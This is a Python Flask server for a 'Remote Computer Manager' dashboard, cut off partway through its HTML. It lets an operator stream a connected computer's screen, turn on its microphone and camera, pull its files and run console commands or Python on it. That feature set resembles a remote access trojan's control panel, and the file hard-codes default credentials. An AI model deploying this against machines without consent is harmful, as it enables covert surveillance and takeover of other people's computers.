
import os
import io
import json
import time
import uuid
import hmac
import queue
import base64
import threading

from collections import deque
from datetime import timedelta
from functools import wraps
from flask import (
    Flask, request, jsonify, Response,
    render_template_string, send_file,
    session, redirect, url_for
)

app = Flask(__name__)

# ==================================================
# CONFIGURATION
# ==================================================

USERNAME = os.environ.get("DASH_USER", "xyrielly")
PASSWORD = os.environ.get("DASH_PASSWORD", "BRODONTHACKME1")

app.secret_key = (
    os.environ.get("DASH_SECRET")
    or hmac.new(
        PASSWORD.encode(),
        b"remote-admin-dashboard-session",
        "sha256"
    ).hexdigest()
)

app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=30)

MAX_FILE_SIZE = 20 * 1024 * 1024
MAX_SCREENSHOT_SIZE = 10 * 1024 * 1024
MAX_STREAM_FRAME_SIZE = 5 * 1024 * 1024
MAX_AUDIO_CHUNK_SIZE = 256 * 1024
MAX_CAMERA_FRAME_SIZE = 5 * 1024 * 1024

MAX_AUDIO_CHUNK_AGE = 3.0

clients = {}
client_actions = {}
downloads = {}
screenshots = {}
streams = {}
stream_viewers = {}
mic_streams = {}
camera_streams = {}
console_commands = {}
python_requests = {}
listing_requests = {}

lock = threading.Lock()

NAME_REUSE_SECONDS = 90
OFFLINE_AFTER_SECONDS = 60


# ==================================================
# GUI ACTIVITY LOG
# ==================================================

LOG_LIMIT = 500

app_logs = deque(maxlen=LOG_LIMIT)
log_sequence = 0
log_lock = threading.Lock()

SERVER_STARTED = time.time()

ACTION_LABELS = {
    "/api/mic/start": "Microphone started",
    "/api/mic/stop": "Microphone stopped",
    "/api/camera/start": "Camera started",
    "/api/camera/stop": "Camera stopped",
    "/api/request-screenshot": "Screenshot requested",
    "/api/request-download": "File download requested",
    "/api/python/run": "Python code sent to the computer",
    "/api/console/command": "Console command sent",
}


def add_log(level, message, source="server"):

    global log_sequence

    with log_lock:

        log_sequence += 1

        app_logs.append({
            "id": log_sequence,
            "time": time.time(),
            "level": level,
            "source": source,
            "message": str(message)[:1000],
        })


add_log("info", "Server started, waiting for computers to connect.")


@app.after_request
def record_request_result(response):

    if request.path == "/api/logs" or request.path == "/favicon.ico":
        return response

    if response.status_code >= 400:

        detail = ""

        if response.mimetype == "application/json" and not response.is_streamed:
            body = response.get_json(silent=True) or {}
            detail = body.get("error") or body.get("message") or ""

        message = (
            f"{request.method} {request.path} "
            f"returned {response.status_code}"
        )

        if detail:
            message += f": {detail}"

        add_log(
            "error" if response.status_code >= 500 else "warn",
            message
        )

    elif request.method == "POST":

        label = ACTION_LABELS.get(request.path)

        if label:
            add_log("info", label)

    return response


# ==================================================
# AUTHENTICATION
# ==================================================

def valid_credentials(auth):

    if not auth:
        return False

    valid_user = hmac.compare_digest(
        auth.username or "", USERNAME
    )

    valid_password = hmac.compare_digest(
        auth.password or "", PASSWORD
    )

    return valid_user and valid_password


def is_signed_in():

    return session.get("user") == USERNAME


def is_machine_request():

    return (
        request.path in ("/sync", "/next-action")
        or request.path.startswith("/upload-")
    )


def current_path():

    query = request.query_string.decode("utf-8", "ignore")

    return request.path + ("?" + query if query else "")


def normalize_next(value):

    value = (value or "").strip()

    if value.startswith("/") and not value.startswith("//"):
        return value

    return ""


def require_auth(function):

    @wraps(function)
    def wrapper(*args, **kwargs):

        # The client agent still authenticates with HTTP Basic,
        # while the browser uses the login form session cookie.
        if is_machine_request():

            if valid_credentials(request.authorization):
                return function(*args, **kwargs)

            return jsonify({"error": "Authentication required"}), 401

        if is_signed_in():
            return function(*args, **kwargs)

        if request.path.startswith("/api/"):
            return jsonify({"error": "Authentication required"}), 401

        return redirect(
            url_for("login", next=current_path())
        )

    return wrapper


# ==================================================
# TREE HELPERS
# ==================================================

def find_folder(node, relative_path):

    if not isinstance(node, dict):
        return None

    relative_path = (relative_path or "").replace("\\", "/")

    if relative_path in ("", "."):
        return node

    parts = [part for part in relative_path.split("/") if part]

    if ".." in parts:
        return None

    current = node

    for part in parts:

        if not isinstance(current.get("dirs"), list):
            return None

        found = None

        for folder in current["dirs"]:
            if folder.get("name", "").lower() == part.lower():
                found = folder
                break

        if found is None:
            return None

        current = found

    return current


def get_folder_listing(node):

    if not isinstance(node, dict):
        return []

    return [
        {
            "name": folder.get("name", ""),
            "path": folder.get("path", "")
        }
        for folder in node.get("dirs", [])
    ]


# ==================================================
# CLIENT NAME ALLOCATION
# ==================================================

def allocate_client_name(computer_name, now):

    base_name = (computer_name or "").strip()[:120] or "Computer"

    entry = clients.get(base_name)

    if not entry or now - entry["last_seen"] > NAME_REUSE_SECONDS:
        return base_name

    index = 1

    while True:

        candidate = f"{base_name} ({index})"

        entry = clients.get(candidate)

        if not entry or now - entry["last_seen"] > NAME_REUSE_SECONDS:
            return candidate

        index += 1


def remove_client(name):

    clients.pop(name, None)
    client_actions.pop(name, None)
    streams.pop(name, None)
    stream_viewers.pop(name, None)
    mic_streams.pop(name, None)
    camera_streams.pop(name, None)

    add_log("warn", f"Computer went offline: {name}")


def normalize_listing_path(path):
    path = (path or "").replace("\\", "/").strip()

    parts = [part for part in path.split("/") if part and part != "."]

    if ".." in parts:
        raise ValueError("Invalid path.")

    return "/".join(parts)


def merge_tree(old_tree, new_tree):

    if not isinstance(old_tree, dict) or not isinstance(new_tree, dict):
        return new_tree

    merged = dict(new_tree)
    merged["loaded"] = True

    previous = {
        folder.get("name", "").lower(): folder
        for folder in old_tree.get("dirs", [])
        if isinstance(folder, dict)
    }

    dirs = []

    for folder in new_tree.get("dirs", []):

        prior = previous.get(folder.get("name", "").lower())

        if prior and prior.get("loaded"):

            combined = dict(folder)
            combined["dirs"] = prior.get("dirs", [])
            combined["files"] = prior.get("files", [])
            combined["loaded"] = True
            dirs.append(combined)

        else:
            dirs.append(folder)

    merged["dirs"] = dirs

    return merged


def store_listing(client, path, listing):

    target = find_folder(client.get("tree"), path)

    if target is None:
        return False

    target["dirs"] = listing.get("dirs", [])
    target["files"] = listing.get("files", [])
    target["loaded"] = True

    return True


# ==================================================
# DASHBOARD HTML
# ==================================================

HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 25px;
            background: #101410;
            color: #c8e6c9;
            font-family: Consolas, monospace;
        }

        h1 {
            color: #8bcf8b;
            letter-spacing: 1px;
            border-bottom: 1px solid #385b38;
            padding-bottom: 15px;
            margin-bottom: 25px;
        }

        .topbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 16px;
            border-bottom: 1px solid #385b38;
            padding-bottom: 15px;
            margin-bottom: 25px;
        }

        .topbar h1 {
            margin: 0;
            padding: 0;
            border-bottom: none;
        }

        .signout {
            flex: 0 0 auto;
            padding: 6px 12px;
            border: 1px solid #2c452c;
            border-radius: 6px;
            color: #789078;
            font-size: 11px;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            text-decoration: none;
            transition:
                color 160ms ease,
                border-color 160ms ease,
                background 160ms ease;
        }

        .signout:hover {
            color: #c8e6c9;
            border-color: #477d47;
            background: #1d2b1d;
        }

        h2 {
            color: #8bcf8b;
            font-size: 20px;
        }

        h3 {
            color: #8bcf8b;
            margin-bottom: 10px;
        }

        .panel {
            background: #050805;
            border: 1px solid #385b38;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px #000;
        }

        input, select, textarea {
            background: #101810;
            color: #c8e6c9;
            border: 1px solid #385b38;
            padding: 11px;
            border-radius: 4px;
            font-family: Consolas, monospace;
        }

        select option {
            background: #101810;
            color: #c8e6c9;
        }

        button {
            background: #315d31;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-family: Consolas, monospace;
        }

        button:hover {
            background: #477d47;
        }

        button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .row {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }

        .row input {
            flex: 1;
            min-width: 180px;
        }

        .output {
            background: #0a0f0a;
            border: 1px solid #2c452c;
            padding: 15px;
            border-radius: 6px;
            margin-top: 12px;
            overflow-wrap: anywhere;
            min-height: 50px;
        }

        .directory {
            margin: 8px 0;
        }

        .file-item {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
            padding: 10px;
            margin-bottom: 7px;
            background: #0d160d;
            border: 1px solid #2c452c;
            border-radius: 5px;
        }

        .file-name {
            overflow-wrap: anywhere;
            flex: 1;
        }

        .folder-button {
            background: transparent;
            color: #7ee787;
            text-align: left;
            font-size: 14px;
            padding: 7px;
        }

        .folder-button:hover {
            background: #1d2b1d;
        }

        .muted {
            color: #789078;
        }

        .status {
            color: #8bcf8b;
        }

        #screenshot {
            display: block;
            width: 100%;
            max-width: 1000px;
            height: auto;
            margin-top: 15px;
            border-radius: 6px;
            border: 1px solid #385b38;
            background: #050805;
        }

        #streamImage {
            display: block;
            width: 100%;
            max-width: 1000px;
            height: auto;
            margin-top: 15px;
            border-radius: 6px;
            border: 1px solid #385b38;
            background: #050805;
        }

        #cameraImage {
            display: block;
            width: 100%;
            max-width: 1000px;
            height: auto;
            margin-top: 15px;
            border-radius: 6px;
            border: 1px solid #385b38;
            background: #050805;
        }

        .level-track {
            margin-top: 12px;
            height: 10px;
            background: #0a0f0a;
            border: 1px solid #2c452c;
            border-radius: 5px;
            overflow: hidden;
        }

        .level-fill {
            height: 100%;
            width: 0;
            background: #477d47;
            transition: width 120ms linear;
        }

        .panel-header {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .panel-header h2 {
            margin: 0;
        }

        #directoryTree {
            overflow-x: auto;
        }

        .file-status {
            color: #7ee787;
            margin-top: 10px;
        }

        #pythonCode {
            display: block;
            width: 100%;
            min-height: 220px;
            resize: vertical;
            background: #050805;
            color: #c8e6c9;
            border: 1px solid #385b38;
            border-radius: 6px;
            padding: 12px;
            font-family: Consolas, monospace;
            font-size: 14px;
            line-height: 1.5;
            tab-size: 4;
        }

        #pythonOutput {
            white-space: pre-wrap;
            font-family: Consolas, monospace;
        }

        /* ---------- UI POLISH ---------- */

        button {
            transition:
                background 160ms ease,
                transform 160ms ease,
                box-shadow 160ms ease;
        }

        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 18px rgba(71, 125, 71, 0.28);
        }

        button:active {
            transform: translateY(0);
        }

        input:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: #6ba36b;
            box-shadow: 0 0 0 3px rgba(71, 125, 71, 0.22);
        }

        .panel {
            animation: panel-in 420ms ease both;
            transition:
                border-color 200ms ease,
                box-shadow 200ms ease;
        }

        .panel:hover {
            border-color: #446b44;
            box-shadow:
                0 0 20px #000,
                0 0 28px rgba(71, 125, 71, 0.12);
        }

        .panel:nth-of-type(2) { animation-delay: 40ms; }
        .panel:nth-of-type(3) { animation-delay: 80ms; }
        .panel:nth-of-type(4) { animation-delay: 120ms; }
        .panel:nth-of-type(5) { animation-delay: 160ms; }
        .panel:nth-of-type(6) { animation-delay: 200ms; }
        .panel:nth-of-type(7) { animation-delay: 240ms; }

        @keyframes panel-in {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: #0a0f0a;
        }

        ::-webkit-scrollbar-thumb {
            background: #2c452c;
            border-radius: 6px;
            border: 2px solid #0a0f0a;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #477d47;
        }

        /* ---------- TOASTS ---------- */

        .toast-stack {
            position: fixed;
            right: 18px;
            bottom: 78px;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 10px;
            pointer-events: none;
        }

        .toast {
            position: relative;
            width: 340px;
            max-width: calc(100vw - 36px);
            padding: 12px 38px 13px 15px;
            background: rgba(5, 9, 5, 0.96);
            border: 1px solid #2c452c;
            border-left: 3px solid #477d47;
            border-radius: 10px;
            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(12px);
            pointer-events: auto;
            overflow: hidden;
            opacity: 0;
            transform: translateX(120%);
            animation: toast-in 340ms cubic-bezier(0.2, 0.9, 0.3, 1.15) forwards;
            transition: box-shadow 180ms ease;
        }

        .toast:hover {
            box-shadow:
                0 16px 40px rgba(0, 0, 0, 0.7),
                0 0 22px rgba(71, 125, 71, 0.18);
        }

        .toast.info    { border-left-color: #7fbf7f; }
        .toast.success { border-left-color: #7ee787; }
        .toast.warn    { border-left-color: #e5b454; }
        .toast.error   { border-left-color: #ff6b6b; }

        .toast.leaving {
            animation: toast-out 260ms ease forwards;
        }

        .toast-title {
            font-size: 11px;
            letter-spacing: 1.2px;
            text-transform: uppercase;
            color: #7ee787;
            margin-bottom: 4px;
        }

        .toast.warn .toast-title  { color: #e5b454; }
        .toast.error .toast-title { color: #ff8080; }

        .toast-message {
            font-size: 13px;
            line-height: 1.45;
            color: #d9efd9;
            overflow-wrap: anywhere;
        }

        .toast-close {
            position: absolute;
            top: 6px;
            right: 7px;
            background: transparent;
            color: #789078;
            font-size: 17px;
            line-height: 1;
            padding: 4px 6px;
            border-radius: 6px;
            box-shadow: none;
        }

        .toast-close:hover {
            color: #c8e6c9;
            background: #1d2b1d;
            transform: none;
            box-shadow: none;
        }

        .toast-progress {
            position: absolute;
            left: 0;
            bottom: 0;
            height: 2px;
            width: 100%;
            background: currentColor;
            transform-origin: left;
        }

        .toast.info    .toast-progress { color: #7fbf7f; }
        .toast.success .toast-progress { color: #7ee787; }
        .toast.warn    .toast-progress { color: #e5b454; }
        .toast.error   .toast-progress { color: #ff6b6b; }

        @keyframes toast-in {
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes toast-out {
            from {
                opacity: 1;
                transform: translateX(0);
            }
            to {
                opacity: 0;
                transform: translateX(60%);
            }
        }

        @keyframes toast-progress {
            from { transform: scaleX(1); }
            to { transform: scaleX(0); }
        }

        /* ---------- LOG DRAWER ---------- */

        .log-toggle {
            position: fixed;
            right: 18px;
            bottom: 18px;
            z-index: 1001;
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 9px 16px;
            background: rgba(8, 13, 8, 0.94);
            border: 1px solid #385b38;
            border-radius: 999px;
            color: #c8e6c9;
            font-size: 13px;
            backdrop-filter: blur(12px);
            box-shadow: 0 10px 26px rgba(0, 0, 0, 0.55);
        }

        .log-toggle .log-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #7ee787;
            box-shadow: 0 0 10px #7ee787;
            animation: log-pulse 2.2s ease-in-out infinite;
        }

        .log-count {
            min-width: 20px;
            padding: 1px 6px;
            border-radius: 999px;
            background: #477d47;
            color: #050805;
            font-size: 11px;
            font-weight: bold;
            text-align: center;
        }

        .log-count.error {
            background: #ff6b6b;
            color: #1a0505;
        }

        @keyframes log-pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.35; }
        }

        .log-drawer {
            position: fixed;
            right: 18px;
            bottom: 68px;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            width: 470px;
            max-width: calc(100vw - 36px);
            height: 360px;
            max-height: calc(100vh - 130px);
            background: rgba(5, 9, 5, 0.97);
            border: 1px solid #385b38;
            border-radius: 12px;
            box-shadow: 0 24px 70px rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(14px);
            opacity: 0;
            transform: translateY(16px) scale(0.98);
            pointer-events: none;
            transition:
                opacity 240ms ease,
                transform 280ms cubic-bezier(0.2, 0.9, 0.3, 1.1);
        }

        .log-drawer.open {
            opacity: 1;
            transform: translateY(0) scale(1);
            pointer-events: auto;
        }

        .log-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            padding: 12px 14px;
            border-bottom: 1px solid #2c452c;
        }

        .log-title {
            display: flex;
            align-items: center;
            gap: 9px;
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
            color: #8bcf8b;
        }

        .log-title .log-dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #7ee787;
            box-shadow: 0 0 9px #7ee787;
            animation: log-pulse 2.2s ease-in-out infinite;
        }

        .log-actions {
            display: flex;
            gap: 6px;
        }

        .log-action {
            background: transparent;
            border: 1px solid #2c452c;
            color: #9fbf9f;
            font-size: 12px;
            padding: 4px 10px;
            border-radius: 6px;
        }

        .log-action:hover {
            background: #1d2b1d;
            color: #c8e6c9;
            transform: none;
            box-shadow: none;
        }

        .log-close {
            font-size: 16px;
            line-height: 1;
            padding: 2px 9px;
        }

        .log-list {
            flex: 1;
            overflow-y: auto;
            padding: 8px 12px 12px;
            font-size: 12px;
        }

        .log-entry {
            display: flex;
            gap: 9px;
            align-items: baseline;
            padding: 6px 2px;
            border-bottom: 1px solid rgba(56, 91, 56, 0.22);
            animation: log-in 260ms ease both;
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        @keyframes log-in {
            from {
                opacity: 0;
                transform: translateY(-4px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .log-time {
            flex: 0 0 auto;
            color: #567356;
            font-variant-numeric: tabular-nums;
        }

        .log-level {
            flex: 0 0 46px;
            font-size: 10px;
            letter-spacing: 0.6px;
            text-transform: uppercase;
            color: #7fbf7f;
        }

        .log-entry.warn .log-level  { color: #e5b454; }
        .log-entry.error .log-level { color: #ff8080; }
        .log-entry.success .log-level { color: #7ee787; }

        .log-entry.error .log-message { color: #ffc9c9; }

        .log-message {
            flex: 1;
            color: #c8e6c9;
            overflow-wrap: anywhere;
            line-height: 1.4;
        }

        .log-empty {
            color: #567356;
            text-align: center;
            padding: 30px 0;
        }

        /* ---------- LIVE SCREEN ---------- */

        .live-screen-head {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 14px;
        }

        .live-screen-head h2 {
            margin: 0;
        }

        .live-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 5px 12px;
            border-radius: 999px;
            border: 1px solid #2c452c;
            background: #0a0f0a;
            color: #789078;
            font-family: Consolas, monospace;
            font-size: 12px;
            transition:
                color 220ms ease,
                border-color 220ms ease,
                box-shadow 220ms ease;
        }

        .live-badge .dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #3d563d;
            transition:
                background 220ms ease,
                box-shadow 220ms ease;
        }

        .live-badge.busy {
            color: #e5b454;
            border-color: #6a5320;
        }

        .live-badge.busy .dot {
            background: #e5b454;
            box-shadow: 0 0 9px #e5b454;
            animation: log-pulse 1s ease-in-out infinite;
        }

        .live-badge.live {
            color: #7ee787;
            border-color: #477d47;
            box-shadow: 0 0 16px rgba(126, 231, 135, 0.18);
        }

        .live-badge.live .dot {
            background: #7ee787;
            box-shadow: 0 0 9px #7ee787;
            animation: log-pulse 1.8s ease-in-out infinite;
        }

        .live-stage {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            min-height: 240px;
            max-height: 64vh;
            border: 1px solid #243a24;
            border-radius: 10px;
            overflow: hidden;
            background:
                radial-gradient(
                    120% 120% at 50% 0%,
                    #0b140b 0%,
                    #050805 62%
                ),
                #050805;
            cursor: crosshair;
            user-select: none;
            transition:
                border-color 280ms ease,
                box-shadow 280ms ease;
        }

        .live-stage.visible {
            border-color: #4c7a4c;
            box-shadow:
                0 0 0 1px rgba(126, 231, 135, 0.08),
                0 0 34px rgba(71, 125, 71, 0.22),
                inset 0 0 60px rgba(0, 0, 0, 0.55);
        }

        .live-view {
            position: absolute;
            inset: 0;
            opacity: 0;
            transform: scale(1.015);
            pointer-events: none;
            transition:
                opacity 400ms ease,
                transform 400ms ease;
        }

        .live-stage.visible .live-view {
            opacity: 1;
            transform: scale(1);
        }

        #liveScreenImage {
            display: block;
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .live-scan {
            position: absolute;
            inset: 0;
            pointer-events: none;
            opacity: 0;
            background: linear-gradient(
                to bottom,
                transparent 0%,
                rgba(126, 231, 135, 0.05) 48%,
                rgba(126, 231, 135, 0.11) 50%,
                transparent 52%
            );
            background-size: 100% 220%;
            mix-blend-mode: screen;
            transition: opacity 500ms ease;
        }

        .live-stage.visible .live-scan {
            opacity: 1;
            animation: live-scan 3.6s linear infinite;
        }

        @keyframes live-scan {
            from { background-position: 0 -120%; }
            to   { background-position: 0 240%; }
        }

        .live-hint {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            gap: 7px;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
            pointer-events: none;
            color: #6d8a6d;
            font-size: 14px;
            letter-spacing: 0.3px;
            background: radial-gradient(
                60% 60% at 50% 50%,
                rgba(9, 16, 9, 0.55),
                rgba(5, 8, 5, 0) 75%
            );
            transition: opacity 320ms ease;
        }

        .live-hint-sub {
            font-size: 12px;
            color: #4f6b4f;
        }

        .live-stage.has-frame .live-hint {
            opacity: 0;
        }

        .live-ripple {
            position: absolute;
            width: 14px;
            height: 14px;
            margin: -7px 0 0 -7px;
            border-radius: 50%;
            border: 2px solid #7ee787;
            box-shadow: 0 0 16px rgba(126, 231, 135, 0.75);
            pointer-events: none;
            animation: live-ping 520ms ease-out forwards;
        }

        @keyframes live-ping {
            from {
                opacity: 0.95;
                transform: scale(0.45);
            }
            to {
                opacity: 0;
                transform: scale(3.4);
            }
        }

        /* ---------- LIVE SCREEN CONTROLS ---------- */

        .live-toggle-btn {
            padding: 5px 14px;
            font-size: 12px;
            border-radius: 6px;
            border: 1px solid #3a5a3a;
            background: #0d1a0d;
            color: #7ee787;
            cursor: pointer;
            transition: background 160ms ease, border-color 160ms ease;
            white-space: nowrap;
        }

        .live-toggle-btn:hover {
            background: #162a16;
            border-color: #5a8a5a;
        }

        .live-stage.minimized {
            display: none;
        }

        .live-keyboard {
            display: none;
            margin-top: 10px;
            border: 1px solid #243a24;
            border-radius: 8px;
            background: #080e08;
            padding: 10px 12px;
        }

        .live-keyboard.visible {
            display: block;
        }

        .live-kb-row {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-bottom: 5px;
        }

        .live-kb-row:last-child {
            margin-bottom: 0;
        }

        .kb-key {
            min-width: 34px;
            height: 32px;
            padding: 0 7px;
            border-radius: 5px;
            border: 1px solid #2e4a2e;
            background: #0d1a0d;
            color: #a8c8a8;
            font-family: Consolas, monospace;
            font-size: 12px;
            cursor: pointer;
            transition: background 100ms ease, color 100ms ease;
            user-select: none;
        }

        .kb-key:hover {
            background: #1a2e1a;
            color: #7ee787;
            border-color: #4a7a4a;
        }

        .kb-key:active, .kb-key.pressed {
            background: #2a4a2a;
            color: #7ee787;
            border-color: #7ee787;
        }

        .kb-key.wide { min-width: 60px; }
        .kb-key.wider { min-width: 80px; }
        .kb-key.space { flex: 1; min-width: 120px; }

        .live-kb-input-row {
            display: flex;
            gap: 6px;
            margin-top: 8px;
            align-items: center;
        }

        .live-kb-input-row input {
            flex: 1;
            background: #050805;
            border: 1px solid #2c452c;
            border-radius: 5px;
            color: #c8e8c8;
            font-family: Consolas, monospace;
            font-size: 13px;
            padding: 5px 10px;
            outline: none;
        }

        .live-kb-input-row input:focus {
            border-color: #4a7a4a;
        }

        .live-kb-hint {
            font-size: 11px;
            color: #4f6b4f;
            margin-top: 6px;
        }

        /* ---------- REMOTE CONSOLE ---------- */

        .console-screen {
            background: #050805;
            border: 1px solid #2c452c;
            border-radius: 6px;
            padding: 14px 16px;
            height: 300px;
            overflow-y: auto;
            font-family: Consolas, monospace;
            font-size: 13px;
            line-height: 1.55;
            white-space: pre-wrap;
            overflow-wrap: anywhere;
            box-shadow: inset 0 0 30px rgba(0, 0, 0, 0.6);
            transition: border-color 200ms ease;
        }

        .console-screen:focus-within {
            border-color: #477d47;
        }

        .console-line {
            animation: console-in 180ms ease both;
        }

        .console-echo {
            color: #7ee787;
        }

        .console-out {
            color: #c8e6c9;
        }

        .console-err {
            color: #ff8080;
        }

        .console-muted {
            color: #567356;
        }

        @keyframes console-in {
            from {
                opacity: 0;
                transform: translateY(2px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .console-input-row {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 12px;
        }

        .console-prompt {
            color: #7ee787;
            font-family: Consolas, monospace;
            font-size: 13px;
            white-space: nowrap;
        }

        #consoleInput {
            flex: 1;
            min-width: 0;
            background: #050805;
        }
    </style>
</head>

<body>

<div class="topbar">
    <h1>Remote Computer Manager</h1>
    <a class="signout" href="/logout">Sign out</a>
</div>

<div class="panel">

    <div class="live-screen-head">

        <h2>Live Screen</h2>

        <div style="display:flex;align-items:center;gap:10px;">
            <span id="liveScreenStatus" class="live-badge" aria-live="polite">
                <span class="dot"></span>
                <span id="liveScreenStatusText">Minimized</span>
            </span>
            <button id="liveToggleBtn" class="live-toggle-btn" onclick="liveToggleMaximize()">Maximize</button>
        </div>

    </div>

    <div id="liveStage" class="live-stage minimized">

        <div class="live-view">
            <img id="liveScreenImage" alt="Live remote screen">
        </div>

        <div class="live-scan"></div>

        <div class="live-hint">
            <span>Click anywhere on the screen to control that computer</span>
            <span class="live-hint-sub">Scroll, hold-click, and use the keyboard below</span>
        </div>

    </div>

    <div id="liveKeyboard" class="live-keyboard">
        <div class="live-kb-row">
            <button class="kb-key" data-key="Escape">Esc</button>
            <button class="kb-key" data-key="F1">F1</button>
            <button class="kb-key" data-key="F2">F2</button>
            <button class="kb-key" data-key="F3">F3</button>
            <button class="kb-key" data-key="F4">F4</button>
            <button class="kb-key" data-key="F5">F5</button>
            <button class="kb-key" data-key="F6">F6</button>
            <button class="kb-key" data-key="F7">F7</button>
            <button class="kb-key" data-key="F8">F8</button>
            <button class="kb-key" data-key="F9">F9</button>
            <button class="kb-key" data-key="F10">F10</button>
            <button class="kb-key" data-key="F11">F11</button>
            <button class="kb-key" data-key="F12">F12</button>
            <button class="kb-key wide" data-key="Delete">Del</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key" data-key="`">`</button>
            <button class="kb-key" data-key="1">1</button>
            <button class="kb-key" data-key="2">2</button>
            <button class="kb-key" data-key="3">3</button>
            <button class="kb-key" data-key="4">4</button>
            <button class="kb-key" data-key="5">5</button>
            <button class="kb-key" data-key="6">6</button>
            <button class="kb-key" data-key="7">7</button>
            <button class="kb-key" data-key="8">8</button>
            <button class="kb-key" data-key="9">9</button>
            <button class="kb-key" data-key="0">0</button>
            <button class="kb-key" data-key="-">-</button>
            <button class="kb-key" data-key="=">=</button>
            <button class="kb-key wider" data-key="Backspace">&#9003;</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wide" data-key="Tab">Tab</button>
            <button class="kb-key" data-key="q">Q</button>
            <button class="kb-key" data-key="w">W</button>
            <button class="kb-key" data-key="e">E</button>
            <button class="kb-key" data-key="r">R</button>
            <button class="kb-key" data-key="t">T</button>
            <button class="kb-key" data-key="y">Y</button>
            <button class="kb-key" data-key="u">U</button>
            <button class="kb-key" data-key="i">I</button>
            <button class="kb-key" data-key="o">O</button>
            <button class="kb-key" data-key="p">P</button>
            <button class="kb-key" data-key="[">[</button>
            <button class="kb-key" data-key="]">]</button>
            <button class="kb-key" data-key="\">\</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wider" data-key="CapsLock">Caps</button>
            <button class="kb-key" data-key="a">A</button>
            <button class="kb-key" data-key="s">S</button>
            <button class="kb-key" data-key="d">D</button>
            <button class="kb-key" data-key="f">F</button>
            <button class="kb-key" data-key="g">G</button>
            <button class="kb-key" data-key="h">H</button>
            <button class="kb-key" data-key="j">J</button>
            <button class="kb-key" data-key="k">K</button>
            <button class="kb-key" data-key="l">L</button>
            <button class="kb-key" data-key=";">;</button>
            <button class="kb-key" data-key="'">'</button>
            <button class="kb-key wider" data-key="Enter">Enter</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wider" data-key="Shift">Shift</button>
            <button class="kb-key" data-key="z">Z</button>
            <button class="kb-key" data-key="x">X</button>
            <button class="kb-key" data-key="c">C</button>
            <button class="kb-key" data-key="v">V</button>
            <button class="kb-key" data-key="b">B</button>
            <button class="kb-key" data-key="n">N</button>
            <button class="kb-key" data-key="m">M</button>
            <button class="kb-key" data-key=",">,</button>
            <button class="kb-key" data-key=".">.</button>
            <button class="kb-key" data-key="/">/</button>
            <button class="kb-key wider" data-key="Shift">Shift</button>
            <button class="kb-key" data-key="ArrowUp">&#8593;</button>
        </div>
        <div class="live-kb-row">
            <button class="kb-key wide" data-key="Control">Ctrl</button>
            <button class="kb-key wide" data-key="Meta">Win</button>
            <button class="kb-key wide" data-key="Alt">Alt</button>
            <button class="kb-key space" data-key=" ">Space</button>
            <button class="kb-key wide" data-key="Alt">Alt</button>
            <button class="kb-key wide" data-key="Control">Ctrl</button>
            <button class="kb-key" data-key="ArrowLeft">&#8592;</button>
            <button class="kb-key" data-key="ArrowDown">&#8595;</button>
            <button class="kb-key" data-key="ArrowRight">&#8594;</button>
        </div>
        <div class="live-kb-input-row">
            <input id="liveKbInput" type="text" placeholder="Type here and press Enter to send text..." autocomplete="off" spellcheck="false">
            <button class="kb-key wide" onclick="liveKbSendText()">Send</button>
        </div>
        <div class="live-kb-hint">Keys send immediately. Modifiers (Ctrl/Alt/Shift) toggle on/off. Text box sends typed characters.</div>
    </div>

</div>


<div class="panel">
    <h2>Connected Computers</h2>

    <div class="row">
        <select id="computerSelect">
